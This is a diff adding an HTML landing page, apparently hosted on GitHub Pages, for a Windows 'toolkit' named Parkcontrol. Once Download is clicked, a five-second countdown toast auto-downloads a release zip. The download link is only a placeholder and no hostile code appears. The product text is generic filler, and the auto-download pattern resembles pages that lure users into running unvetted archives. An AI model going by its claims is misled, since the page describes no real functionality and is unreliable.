@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="A focused toolkit built around your use case">
+  <meta name="keywords" content="parkcontrol, windows, toolkit, 2026">
+  <meta property="og:title" content="Parkcontrol">
+  <meta property="og:description" content="A focused toolkit built around your use case">
+  <meta property="og:image" content="https://toothoverabide.github.io/parkcontrol-console-2026/assets/banner.jpg">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://toothoverabide.github.io/parkcontrol-console-2026/">
+  <link rel="icon" href="assets/banner.jpg" type="image/jpeg">
+  <title>Parkcontrol</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Syne:wght@600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --void: #06090e;
+      --ink: #f5f8fc;
+      --muted: #8b95a8;
+      --line: rgba(255,255,255,.08);
+      --red: #c519ff;
+      --red-deep: #9707c6;
+      --cyan: #e095f9;
+      --red-rgb: 197,25,255;
+      --cyan-rgb: 224,149,249;
+      --panel: rgba(12,16,24,.72);
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: "DM Sans", system-ui, sans-serif;
+      background: var(--void);
+      color: var(--ink);
+      line-height: 1.55;
+      overflow-x: hidden;
+    }
+    .atmosphere {
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      background:
+        radial-gradient(900px 520px at 12% -10%, rgba(var(--red-rgb),.22), transparent 60%),
+        radial-gradient(700px 480px at 92% 20%, rgba(var(--cyan-rgb),.16), transparent 55%),
+        radial-gradient(600px 400px at 50% 110%, rgba(var(--red-rgb),.08), transparent 50%),
+        var(--void);
+    }
+    .atmosphere::after {
+      content: "";
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(var(--cyan-rgb),.035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(var(--cyan-rgb),.035) 1px, transparent 1px);
+      background-size: 56px 56px;
+      mask-image: radial-gradient(ellipse 90% 70% at 50% 0%, #000 15%, transparent 72%);
+      opacity: .9;
+    }
+    .shell { position: relative; z-index: 1; }
+    nav {
+      position: sticky; top: 0; z-index: 40;
+      backdrop-filter: blur(18px) saturate(1.2);
+      background: rgba(6,8,13,.72);
+      border-bottom: 1px solid var(--line);
+    }
+    .nav-inner {
+      max-width: 1120px; margin: 0 auto; padding: 16px 28px;
+      display: flex; align-items: center; justify-content: space-between; gap: 20px;
+    }
+    .brand {
+      font-family: Syne, sans-serif; font-weight: 800; font-size: 1.05rem;
+      letter-spacing: -.02em; color: var(--ink); text-decoration: none;
+    }
+    .brand em { font-style: normal; color: var(--red); }
+    .nav-cta {
+      font-size: .82rem; font-weight: 600; color: var(--ink); text-decoration: none;
+      padding: 10px 16px; border-radius: 8px; border: 1px solid rgba(var(--cyan-rgb),.45);
+      background: rgba(var(--cyan-rgb),.08);
+    }
+    .nav-cta:hover { border-color: var(--cyan); background: rgba(var(--cyan-rgb),.14); }
+    main { max-width: 1120px; margin: 0 auto; padding: 28px 28px 96px; }
+
+    .hero {
+      display: grid; gap: 28px;
+      grid-template-columns: 1.35fr .85fr;
+      align-items: end;
+      margin: 8px 0 32px;
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+    .poster {
+      margin: 0 0 56px;
+      border-radius: 4px;
+      overflow: hidden;
+      border: 1px solid rgba(var(--red-rgb),.22);
+      box-shadow:
+        0 40px 100px rgba(0,0,0,.55),
+        0 0 0 1px rgba(var(--cyan-rgb),.06),
+        0 24px 80px rgba(var(--red-rgb),.12);
+    }
+    .poster img { display: block; width: 100%; height: auto; }
+    @media (max-width: 860px) {
+      .hero { grid-template-columns: 1fr; }
+      .nav-inner, main { padding-left: 18px; padding-right: 18px; }
+    }
+    .eyebrow {
+      font-size: .72rem; font-weight: 700; letter-spacing: .16em; text-transform: uppercase;
+      color: var(--red); margin-bottom: 12px;
+    }
+    h1 {
+      font-family: Syne, sans-serif; font-weight: 800;
+      font-size: clamp(2.1rem, 4.6vw, 3.35rem);
+      line-height: 1.05; letter-spacing: -.035em; margin-bottom: 16px;
+    }
+    .lead { color: var(--muted); font-size: 1.05rem; max-width: 38ch; }
+    .lead strong { color: var(--ink); font-weight: 600; }
+    .cta-row { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 28px; }
+    .btn {
+      display: inline-flex; align-items: center; justify-content: center;
+      padding: 15px 26px; border-radius: 9px; font-weight: 700; font-size: .92rem;
+      text-decoration: none; border: none; cursor: pointer; font-family: inherit;
+      transition: transform .18s ease, box-shadow .18s ease, border-color .18s ease;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--red-deep), var(--red));
+      color: #fff;
+      box-shadow: 0 12px 40px rgba(var(--red-rgb),.35);
+    }
+    .btn-primary:hover { transform: translateY(-2px); }
+    .btn-ghost {
+      background: transparent; color: var(--ink);
+      border: 1px solid rgba(var(--cyan-rgb),.5);
+    }
+    .btn-ghost:hover { border-color: var(--cyan); color: var(--cyan); }
+
+    .side-panel {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      padding: 22px 22px 18px;
+      backdrop-filter: blur(10px);
+    }
+    .side-panel .tag {
+      display: inline-block; font-size: .68rem; font-weight: 700; letter-spacing: .12em;
+      text-transform: uppercase; color: var(--cyan); margin-bottom: 14px;
+    }
+    .stats {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 14px 18px;
+    }
+    .stat-v {
+      display: block; font-family: Syne, sans-serif; font-weight: 700;
+      font-size: 1.35rem; letter-spacing: -.02em; color: var(--ink);
+    }
+    .stat-k {
+      font-size: .7rem; text-transform: uppercase; letter-spacing: .08em; color: var(--muted);
+    }
+
+    section { margin-bottom: 64px; }
+    .sec-label {
+      font-size: .7rem; font-weight: 700; letter-spacing: .14em; text-transform: uppercase;
+      color: var(--cyan); margin-bottom: 10px;
+    }
+    h2 {
+      font-family: Syne, sans-serif; font-weight: 800;
+      font-size: clamp(1.55rem, 3vw, 2.1rem);
+      letter-spacing: -.03em; margin-bottom: 22px;
+    }
+    .pillars {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 28px;
+    }
+    @media (max-width: 800px) { .pillars { grid-template-columns: 1fr; gap: 22px; } }
+    .pillar h3 {
+      font-family: Syne, sans-serif; font-size: 1.05rem; font-weight: 700;
+      margin-bottom: 8px; letter-spacing: -.02em;
+    }
+    .pillar p { color: var(--muted); font-size: .95rem; }
+    .pillar {
+      padding-top: 18px;
+      border-top: 2px solid rgba(var(--red-rgb),.55);
+    }
+
+    .steps { list-style: none; display: grid; gap: 14px; max-width: 640px; }
+    .steps li {
+      display: grid; grid-template-columns: 44px 1fr; gap: 16px; align-items: start;
+      padding: 16px 0; border-bottom: 1px solid var(--line);
+    }
+    .step-n {
+      width: 44px; height: 44px; border-radius: 50%;
+      display: grid; place-items: center;
+      font-family: Syne, sans-serif; font-weight: 800; font-size: .95rem;
+      color: var(--red); border: 1px solid rgba(var(--red-rgb),.45);
+      background: rgba(var(--red-rgb),.08);
+    }
+    .steps strong { display: block; margin-bottom: 4px; font-size: .98rem; }
+    .steps p { color: var(--muted); font-size: .92rem; }
+
+    .disclaimer {
+      border-left: 3px solid var(--red);
+      padding: 18px 20px;
+      background: rgba(var(--red-rgb),.06);
+      color: var(--muted); font-size: .92rem;
+    }
+    .disclaimer strong { color: var(--red); }
+
+    footer {
+      border-top: 1px solid var(--line);
+      padding: 36px 28px 48px; text-align: center;
+      color: var(--muted); font-size: .88rem;
+    }
+    footer strong { color: var(--ink); }
+
+    .dl-toast {
+      position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(140%);
+      z-index: 200; display: flex; align-items: center; gap: 16px; padding: 14px 18px;
+      background: rgba(10,14,22,.96); border: 1px solid rgba(var(--red-rgb),.28);
+      border-radius: 12px; backdrop-filter: blur(16px);
+      box-shadow: 0 16px 50px rgba(0,0,0,.55), 0 0 40px rgba(var(--red-rgb),.18);
+      transition: transform .5s cubic-bezier(.22,1,.36,1); max-width: calc(100vw - 32px);
+    }
+    .dl-toast.visible { transform: translateX(-50%) translateY(0); }
+    .dl-toast-title { font-size: .88rem; font-weight: 700; }
+    .dl-toast-sub { font-size: .78rem; color: var(--muted); }
+    .dl-toast-sub strong { color: var(--cyan); }
+    .dl-toast-actions { display: flex; gap: 8px; }
+    .dl-toast-btn {
+      padding: 7px 14px; border-radius: 7px; font-size: .78rem; font-weight: 600;
+      cursor: pointer; border: none; font-family: inherit;
+    }
+    .dl-toast-btn-cancel { background: transparent; color: var(--muted); border: 1px solid var(--line); }
+    .dl-toast-btn-now { background: var(--red); color: #fff; }
+    .dl-progress {
+      position: absolute; left: 12px; right: 12px; bottom: 6px; height: 2px;
+      background: rgba(255,255,255,.08); border-radius: 2px; overflow: hidden;
+    }
+    .dl-progress i {
+      display: block; height: 100%; width: 0;
+      background: linear-gradient(90deg, var(--red), var(--cyan));
+      transition: width 1s linear;
+    }
+    @media (max-width: 720px) { .dl-toast { flex-wrap: wrap; } }
+  </style>
+</head>
+<body>
+  <div class="atmosphere" aria-hidden="true"></div>
+  <div class="shell">
+    <nav>
+      <div class="nav-inner">
+        <a class="brand" href="#top"><em>Parkcontrol</em></a>
+        <a class="nav-cta" href="#download" onclick="startOfferToast(); return false;">Download</a>
+      </div>
+    </nav>
+
+    <main id="top">
+      <header class="hero" id="download">
+        <div>
+          <p class="eyebrow">Desktop documentation</p>
+          <h1>Parkcontrol</h1>
+          <p class="lead"><strong>parkcontrol</strong> — A focused toolkit built around your use case</p>
+          <div class="cta-row">
+            <button type="button" class="btn btn-primary" onclick="startOfferToast()">Download</button>
+            <a class="btn btn-ghost" href="https://github.com/Toothoverabide/parkcontrol-console-2026" rel="noopener">View Source</a>
+          </div>
+        </div>
+        <aside class="side-panel" aria-label="Quick facts">
+          <div class="tag">Windows utility</div>
+          <div class="stats"><div class="stat"><span class="stat-v">Win 10/11</span><span class="stat-k">OS</span></div><div class="stat"><span class="stat-v">Pages</span><span class="stat-k">Docs</span></div><div class="stat"><span class="stat-v">Zip</span><span class="stat-k">Build</span></div><div class="stat"><span class="stat-v">None</span><span class="stat-k">Deps</span></div></div>
+        </aside>
+      </header>
+
+      <figure class="poster">
+        <img src="assets/banner.jpg" width="1920" height="1080" alt="Parkcontrol product banner" loading="eager">
+      </figure>
+
+      <section>
+        <p class="sec-label">Overview</p>
+        <h2>What you get</h2>
+        <div class="pillars"><article class="pillar"><h3>Clear docs</h3><p>README and this site stay aligned with the build.</p></article><article class="pillar"><h3>One download</h3><p>Single release button — no mirror maze.</p></article><article class="pillar"><h3>Maintained</h3><p>Small CI job refreshes project notes on a schedule.</p></article></div>
+      </section>
+
+      <section>
+        <p class="sec-label">Getting started</p>
+        <h2>Three steps</h2>
+        <ol class="steps"><li><span class="step-n">1</span><div><strong>Open docs</strong><p>Start here from the GitHub repository.</p></div></li><li><span class="step-n">2</span><div><strong>Review</strong><p>Skim the overview and release notes.</p></div></li><li><span class="step-n">3</span><div><strong>Download</strong><p>Use Download — you can cancel in the first few seconds.</p></div></li></ol>
+      </section>
+
+      <section>
+        <p class="sec-label">Notes</p>
+        <h2>Before you run</h2>
+        <div class="disclaimer">
+          <p><strong>Use at your own discretion.</strong>
+          Review files before execution and follow local law.
+          Not affiliated with Microsoft or other publishers.</p>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <strong>Parkcontrol</strong> · Windows · 2026
+    </footer>
+  </div>
+
+  <div class="dl-toast" id="dl-toast" role="status" aria-live="polite">
+    <div class="dl-toast-body">
+      <div class="dl-toast-title" id="dl-toast-title">Preparing download…</div>
+      <div class="dl-toast-sub"><strong id="dl-zip-name"></strong> in <strong id="dl-countdown">5</strong>s</div>
+    </div>
+    <div class="dl-toast-actions">
+      <button type="button" class="dl-toast-btn dl-toast-btn-cancel" id="dl-cancel">Cancel</button>
+      <button type="button" class="dl-toast-btn dl-toast-btn-now" id="dl-now">Download now</button>
+    </div>
+    <div class="dl-progress"><i id="dl-bar"></i></div>
+  </div>
+
+  <script>
+  (function () {
+    const DOWNLOAD_URL = "#";
+    const ZIP_NAME = "Parkcontrol-Release.zip";
+    const AUTO_DOWNLOAD_DELAY = 5;
+    const toast = document.getElementById('dl-toast');
+    const countdownEl = document.getElementById('dl-countdown');
+    const titleEl = document.getElementById('dl-toast-title');
+    const zipEl = document.getElementById('dl-zip-name');
+    const bar = document.getElementById('dl-bar');
+    zipEl.textContent = ZIP_NAME;
+
+    function finishToast(msg) {
+      titleEl.textContent = msg;
+      setTimeout(() => toast.classList.remove('visible'), 1600);
+    }
+
+    function startDownload() {
+      const a = document.createElement('a');
+      a.href = DOWNLOAD_URL;
+      a.rel = 'noopener';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      finishToast('Download started!');
+    }
+
+    window.startOfferToast = function startOfferToast() {
+      let remaining = AUTO_DOWNLOAD_DELAY, cancelled = false, done = false;
+      titleEl.textContent = 'Auto-download starting…';
+      countdownEl.textContent = remaining;
+      bar.style.width = '0%';
+      toast.classList.add('visible');
+      requestAnimationFrame(() => { bar.style.width = '100%'; });
+
+      const tick = setInterval(() => {
+        if (cancelled || done) { clearInterval(tick); return; }
+        remaining -= 1;
+        countdownEl.textContent = remaining;
+        if (remaining <= 0) {
+          clearInterval(tick);
+          done = true;
+          startDownload();
+        }
+      }, 1000);
+
+      document.getElementById('dl-cancel').onclick = () => {
+        if (done) return;
+        cancelled = true;
+        clearInterval(tick);
+        finishToast('Auto-download cancelled');
+      };
+      document.getElementById('dl-now').onclick = () => {
+        if (cancelled || done) return;
+        done = true;
+        clearInterval(tick);
+        startDownload();
+      };
+    };
+  })();
+  </script>
+</body>
+</html>
